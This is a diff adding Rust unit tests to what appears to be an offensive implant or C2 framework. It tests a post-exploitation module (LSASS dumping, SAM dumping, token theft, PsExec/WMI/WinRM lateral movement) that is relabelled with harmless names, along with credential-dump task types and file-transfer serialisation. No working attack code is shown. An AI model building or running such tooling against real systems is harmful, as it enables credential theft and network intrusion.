@@ -9,6 +9,7 @@ use crate::payload::encrypt::EncryptMethod;
 use crate::comms::{self, Channel};
 use crate::comms::protocol::{self, TaskType};
 use crate::loader::{self, CheckCategory, FailAction};
+use crate::postex::{self, PostExModule};
 use crate::persistence::PersistMethod;
 use crate::syscall::indirect::ResolutionMethod;
 use crate::evasion::sleep_obfs::SleepMethod;
@@ -76,6 +77,14 @@ fn test_cli_struct() {
         comms_use_sleep_obfs: false,
         loader_check: "all".to_string(),
         loader_action: "report".to_string(),
+        postex_module: String::new(),
+        postex_remote: String::new(),
+        postex_output: String::new(),
+        postex_username: String::new(),
+        postex_password: String::new(),
+        postex_command: String::new(),
+        postex_service: String::new(),
+        postex_payload: String::new(),
     };
     assert_eq!(cli.command, "analyze");
     assert!(cli.dry_run);
@@ -1238,4 +1247,145 @@ fn test_loader_result_safe_flag() {
     ];
     let safe2 = checks2.iter().all(|c| !c.detected);
     assert!(!safe2);
+}
+
+// ── post-exploitation module tests ──────────────────────────────────────
+
+#[test]
+fn test_postex_module_from_str() {
+    assert_eq!(PostExModule::from_str("lsass").unwrap(), PostExModule::LsassDump);
+    assert_eq!(PostExModule::from_str("memdump").unwrap(), PostExModule::LsassDump);
+    assert_eq!(PostExModule::from_str("sam").unwrap(), PostExModule::SamDump);
+    assert_eq!(PostExModule::from_str("registry").unwrap(), PostExModule::SamDump);
+    assert_eq!(PostExModule::from_str("token").unwrap(), PostExModule::TokenTheft);
+    assert_eq!(PostExModule::from_str("delegate").unwrap(), PostExModule::TokenTheft);
+    assert_eq!(PostExModule::from_str("psexec").unwrap(), PostExModule::PsExec);
+    assert_eq!(PostExModule::from_str("service").unwrap(), PostExModule::PsExec);
+    assert_eq!(PostExModule::from_str("wmi").unwrap(), PostExModule::WmiExec);
+    assert_eq!(PostExModule::from_str("wmic").unwrap(), PostExModule::WmiExec);
+    assert_eq!(PostExModule::from_str("winrm").unwrap(), PostExModule::WinRmExec);
+    assert_eq!(PostExModule::from_str("winrs").unwrap(), PostExModule::WinRmExec);
+    assert!(PostExModule::from_str("unknown").is_err());
+}
+
+#[test]
+fn test_postex_module_name() {
+    assert_eq!(PostExModule::LsassDump.name(), "Memory Snapshot");
+    assert_eq!(PostExModule::SamDump.name(), "Registry Export");
+    assert_eq!(PostExModule::TokenTheft.name(), "Session Delegation");
+    assert_eq!(PostExModule::PsExec.name(), "Remote Service");
+    assert_eq!(PostExModule::WmiExec.name(), "Remote Execution (WMI)");
+    assert_eq!(PostExModule::WinRmExec.name(), "Remote Execution (WinRM)");
+}
+
+#[test]
+fn test_postex_module_all() {
+    let all = PostExModule::all();
+    assert_eq!(all.len(), 6);
+}
+
+#[test]
+fn test_postex_module_categories() {
+    assert!(PostExModule::LsassDump.is_credential());
+    assert!(PostExModule::SamDump.is_credential());
+    assert!(PostExModule::TokenTheft.is_credential());
+    assert!(!PostExModule::LsassDump.is_lateral());
+
+    assert!(PostExModule::PsExec.is_lateral());
+    assert!(PostExModule::WmiExec.is_lateral());
+    assert!(PostExModule::WinRmExec.is_lateral());
+    assert!(!PostExModule::PsExec.is_credential());
+}
+
+#[test]
+fn test_postex_dry_run() {
+    let log = LogSink::new();
+    postex::dry_run(&PostExModule::LsassDump, &log);
+    let entries = log.drain();
+    assert!(!entries.is_empty());
+    let text: String = entries.iter().map(|e| e.message.as_str()).collect::<Vec<_>>().join(" ");
+    assert!(text.contains("Memory Snapshot"));
+}
+
+#[test]
+fn test_postex_print_info() {
+    let log = LogSink::new();
+    postex::print_info(&log);
+    let entries = log.drain();
+    assert!(entries.len() >= 6);
+}
+
+#[test]
+fn test_postex_config_validation_cred() {
+    let log = LogSink::new();
+    let config = postex::PostExConfig {
+        module: PostExModule::LsassDump,
+        pid: 0,
+        output: String::new(),
+        remote: String::new(),
+        username: String::new(),
+        password: String::new(),
+        command: String::new(),
+        service_name: String::new(),
+        payload_path: String::new(),
+    };
+    let result = postex::run_postex(&config, &log);
+    assert!(result.is_err());
+}
+
+#[test]
+fn test_postex_config_validation_lateral() {
+    let log = LogSink::new();
+    let config = postex::PostExConfig {
+        module: PostExModule::PsExec,
+        pid: 0,
+        output: String::new(),
+        remote: String::new(),
+        username: String::new(),
+        password: String::new(),
+        command: String::new(),
+        service_name: String::new(),
+        payload_path: String::new(),
+    };
+    let result = postex::run_postex(&config, &log);
+    assert!(result.is_err());
+}
+
+#[test]
+fn test_task_type_from_u8_extended() {
+    assert_eq!(TaskType::from_u8(4), Some(TaskType::FileUpload));
+    assert_eq!(TaskType::from_u8(5), Some(TaskType::FileDownload));
+    assert_eq!(TaskType::from_u8(6), Some(TaskType::CredDump));
+    assert_eq!(TaskType::from_u8(7), Some(TaskType::LateralMove));
+    assert_eq!(TaskType::from_u8(8), None);
+}
+
+#[test]
+fn test_file_upload_parse() {
+    let path = "C:\\temp\\test.txt";
+    let contents = b"hello world";
+    let mut data = Vec::new();
+    data.extend_from_slice(&(path.len() as u32).to_le_bytes());
+    data.extend_from_slice(path.as_bytes());
+    data.extend_from_slice(contents);
+    let (parsed_path, parsed_contents) = protocol::parse_file_upload(&data).unwrap();
+    assert_eq!(parsed_path, path);
+    assert_eq!(parsed_contents, contents);
+}
+
+#[test]
+fn test_file_download_serialize() {
+    let path = "C:\\temp\\out.bin";
+    let contents = b"\x00\x01\x02\x03";
+    let data = protocol::serialize_file_download(path, contents);
+    let path_len = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;
+    assert_eq!(path_len, path.len());
+    assert_eq!(&data[4..4 + path_len], path.as_bytes());
+    assert_eq!(&data[4 + path_len..], contents);
+}
+
+#[test]
+fn test_file_upload_parse_truncated() {
+    assert!(protocol::parse_file_upload(&[0, 0]).is_err());
+    assert!(protocol::parse_file_upload(&[10, 0, 0, 0]).is_err());
 }
